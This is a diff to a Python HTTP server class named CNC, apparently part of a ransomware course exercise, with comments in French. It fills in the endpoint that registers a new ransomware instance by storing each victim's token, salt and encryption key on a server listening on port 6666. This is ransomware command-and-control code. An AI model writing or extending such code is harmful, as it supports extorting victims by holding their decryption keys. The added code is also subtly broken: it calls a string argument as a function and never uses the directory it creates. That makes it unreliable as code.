@@ -17,9 +17,22 @@ class CNC(CNCBase):
         with open(path, "wb") as f:
             f.write(bin_data)
 
-    def post_new(self, path:str, params:dict, body:dict)->dict:
-        # used to register new ransomware instance
-        return {"status":"KO"}
+    def post_new(self, path: str, params: dict, body: dict) -> dict:
+        # Récupérer les données du sel, de la clé et du token à partir du corps de la requête
+        token = body["token"]
+        salt = body["salt"]
+        key = body["key"]
+
+        # Créer un répertoire pour stocker les données du sel et de la clé
+        token_directory = path(self.ROOT_PATH) / token
+        token_directory.mkdir(parents=True, exist_ok=True)
+
+        # Sauvegarder le sel et la clé dans des fichiers séparés
+        self.save_b64(token, salt, "salt")
+        self.save_b64(token, key, "key")
+
+        # Retourner un dictionnaire indiquant le succès de l'opération
+        return {"status": "OK"}
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
